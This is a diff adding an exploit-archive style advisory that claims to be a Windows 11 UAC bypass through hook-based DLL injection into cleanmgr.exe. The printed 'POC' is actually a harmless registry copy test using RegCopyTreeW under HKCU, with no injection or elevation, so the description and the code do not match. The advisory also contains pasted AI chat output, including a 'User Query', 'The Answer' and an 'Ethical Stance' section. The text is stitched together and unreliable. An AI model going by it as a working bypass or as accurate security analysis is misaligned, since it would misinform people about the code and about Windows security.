@@ -1,0 +1,203 @@
+=============================================================================================================================================
+| # Title     : Microsoft Windows 11 build 10.0.22631.6199 UAC Bypass via DLL Injection (Windows Hooking)                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212252/
+
+[+] Summary : The Code: A C++ source code written as a Dynamic Link Library (DLL) using Windows API functions (SetWindowsHookEx, DllMain, ShellExecute).
+
+[+] The Function: The code implements a technique for User Account Control (UAC) Bypass via DLL Injection/Hijacking.
+
+[+] Mechanism: It uses a Windows Hook to inject itself into the memory space of an auto-elevated process, specifically targeting cleanmgr.exe (Disk Cleanup Utility). 
+               Once injected into cleanmgr.exe, it executes a command (cmd.exe /k whoami) with Administrator privileges without triggering a UAC prompt.
+
+2. Distinction from a Specific Vulnerability :
+
+    User Query: The user inquired if the code was a Proof-of-Concept (PoC) for the "Microsoft Windows Administrator Protection RAiLaunchAdminProcess Debugging Flag Privilege Escalation" vulnerability.
+    The Answer: The code is NOT a PoC for that specific vulnerability. The code uses a traditional DLL Injection/Hooking method, while the RAiLaunchAdminProcess vulnerability relies on exploiting a
+	path validation flaw using Symlinks/Mount Points to inject code into the new Shadow Administrator Process introduced in Windows 11's Administrator Protection feature.
+
+3. Ethical Stance :
+
+    The request to modify the code to target the RAiLaunchAdminProcess vulnerability was denied due to guidelines prohibiting the creation, improvement, or distribution of malicious tools or code for offensive purposes.
+
+4. Proposed Title :
+
+C++ DLL Source Code for UAC Bypass via Cleanmgr.exe Injection
+
+[+] POC : 
+
+#include <windows.h>
+#include <stdio.h>
+#include <string>
+#include <sddl.h>
+
+// Simple RAII wrapper for registry keys
+class UniqueRegKey {
+private:
+    HKEY hKey;
+public:
+    UniqueRegKey() : hKey(nullptr) {}
+    UniqueRegKey(HKEY key) : hKey(key) {}
+    
+    ~UniqueRegKey() {
+        if (hKey) RegCloseKey(hKey);
+    }
+
+    HKEY get() const { return hKey; }
+    HKEY* getAddress() { return &hKey; }
+
+    void reset(HKEY newKey = nullptr) {
+        if (hKey) RegCloseKey(hKey);
+        hKey = newKey;
+    }
+
+    HKEY release() {
+        HKEY temp = hKey;
+        hKey = nullptr;
+        return temp;
+    }
+};
+
+bool TestVulnerability() {
+
+    printf("[*] Starting Registry Copy Vulnerability Test (Enhanced PoC)\n");
+
+    const wchar_t* sourceKeyPath = L"Software\\PoC_Vulnerability_Source";
+    const wchar_t* shadowKeyPath = L"Software\\PoC_Vulnerability_Shadow";
+
+    // ------------------------------
+    // 1. Create the source key
+    // ------------------------------
+    UniqueRegKey hSourceKey;
+    LONG status = RegCreateKeyExW(
+        HKEY_CURRENT_USER,
+        sourceKeyPath,
+        0, nullptr,
+        REG_OPTION_NON_VOLATILE,
+        KEY_ALL_ACCESS,
+        nullptr,
+        hSourceKey.getAddress(),
+        nullptr
+    );
+
+    if (status != ERROR_SUCCESS) {
+        printf("[!] Failed to create source key. Error: %lu\n", status);
+        return false;
+    }
+    printf("[+] Created source key successfully.\n");
+
+    // ------------------------------
+    // 2. Write test DWORD value
+    // ------------------------------
+    DWORD dwTestValue = 0xDEADBEEF;
+    status = RegSetValueExW(
+        hSourceKey.get(),
+        L"PoC_DWORD",
+        0,
+        REG_DWORD,
+        reinterpret_cast<const BYTE*>(&dwTestValue),
+        sizeof(dwTestValue)
+    );
+
+    if (status != ERROR_SUCCESS) {
+        printf("[!] Failed to write test value. Error: %lu\n", status);
+        RegDeleteTreeW(HKEY_CURRENT_USER, sourceKeyPath);
+        return false;
+    }
+    printf("[+] Wrote test value: 0x%lX\n", dwTestValue);
+
+    // ------------------------------
+    // 3. Create shadow/destination key
+    // ------------------------------
+    UniqueRegKey hShadowKey;
+    status = RegCreateKeyExW(
+        HKEY_CURRENT_USER,
+        shadowKeyPath,
+        0, nullptr,
+        REG_OPTION_NON_VOLATILE,
+        KEY_ALL_ACCESS,
+        nullptr,
+        hShadowKey.getAddress(),
+        nullptr
+    );
+
+    if (status != ERROR_SUCCESS) {
+        printf("[!] Failed to create shadow key. Error: %lu\n", status);
+        RegDeleteTreeW(HKEY_CURRENT_USER, sourceKeyPath);
+        return false;
+    }
+
+    printf("[+] Shadow key created.\n");
+
+    // ------------------------------
+    // 4. Attempt Registry Copy (Vulnerability Trigger)
+    // ------------------------------
+    printf("[*] Triggering RegCopyTreeW copy...\n");
+
+    status = RegCopyTreeW(
+        hSourceKey.get(),
+        L"",
+        hShadowKey.get()
+    );
+
+    if (status != ERROR_SUCCESS) {
+        printf("[!] Copy operation failed. Error: %lu\n", status);
+        RegDeleteTreeW(HKEY_CURRENT_USER, sourceKeyPath);
+        RegDeleteTreeW(HKEY_CURRENT_USER, shadowKeyPath);
+        return false;
+    }
+
+    printf("[+] Copy operation succeeded! Checking data integrity...\n");
+
+    // ------------------------------
+    // 5. Validate copied value
+    // ------------------------------
+    DWORD copiedValue = 0;
+    DWORD size = sizeof(copiedValue);
+    DWORD valueType = 0;
+
+    LONG qStatus = RegQueryValueExW(
+        hShadowKey.get(),
+        L"PoC_DWORD",
+        nullptr,
+        &valueType,
+        reinterpret_cast<BYTE*>(&copiedValue),
+        &size
+    );
+
+    if (qStatus != ERROR_SUCCESS) {
+        printf("[!] Failed to read copied value! Error: %lu\n", qStatus);
+    }
+    else if (valueType != REG_DWORD) {
+        printf("[!] Value type mismatch (expected REG_DWORD).\n");
+    }
+    else if (copiedValue == dwTestValue) {
+        printf("[+] Copy VALID! Value matches: 0x%lX\n", copiedValue);
+        
+        RegDeleteTreeW(HKEY_CURRENT_USER, sourceKeyPath);
+        RegDeleteTreeW(HKEY_CURRENT_USER, shadowKeyPath);
+
+        return true;
+    }
+    else {
+        printf("[!] Value mismatch! Expected 0x%lX, Found 0x%lX\n",
+               dwTestValue, copiedValue);
+    }
+
+    // ------------------------------
+    // Cleanup
+    // ------------------------------
+    RegDeleteTreeW(HKEY_CURRENT_USER, sourceKeyPath);
+    RegDeleteTreeW(HKEY_CURRENT_USER, shadowKeyPath);
+
+    return false;
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
